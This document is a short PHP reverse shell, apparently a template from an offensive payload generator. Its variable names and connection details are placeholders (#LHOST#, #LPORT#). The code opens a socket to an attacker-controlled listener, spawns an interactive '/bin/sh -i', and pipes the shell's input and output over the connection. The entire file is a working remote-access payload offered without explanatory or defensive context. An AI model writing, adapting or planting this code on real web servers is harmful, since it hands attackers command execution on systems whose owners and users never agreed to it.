<?php
$#IP# = '#LHOST#';
$#PORT# = #LPORT#;
$#S# = fsockopen($#IP#, $#PORT#);
$#D# = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$#P# = proc_open("/bin/sh -i", $#D#, $#PI#);
if (is_resource($#P#)) {
    while (1) {
        if (feof($#S#)) break;
        if (feof($#PI#[1])) break;
        $#R# = array($#S#, $#PI#[1], $#PI#[2]);
        $#N# = stream_select($#R#, $#W#, $#E#, null);
        if (in_array($#S#, $#R#)) {
            $#I# = fread($#S#, 1400);
            fwrite($#PI#[0], $#I#);
        }
        if (in_array($#PI#[1], $#R#)) {
            $#I# = fread($#PI#[1], 1400);
            fwrite($#S#, $#I#);
        }
        if (in_array($#PI#[2], $#R#)) {
            $#I# = fread($#PI#[2], 1400);
            fwrite($#S#, $#I#);
        }
    }
    fclose($#S#);
    fclose($#PI#[0]);
    fclose($#PI#[1]);
    fclose($#PI#[2]);
    proc_close($#P#);
}
?>
